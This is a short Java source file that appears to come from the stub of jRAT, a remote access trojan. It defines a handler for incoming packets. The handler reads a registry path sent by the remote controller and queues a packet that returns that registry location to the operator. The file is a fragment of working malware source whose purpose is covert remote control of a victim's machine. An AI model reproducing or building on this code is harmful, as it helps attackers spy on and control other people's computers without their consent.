package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet54Registry;

public class Packet79BrowseRegistry extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String path = Connection.readLine();

		Connection.addToSendQueue(new Packet54Registry(path));
	}

}
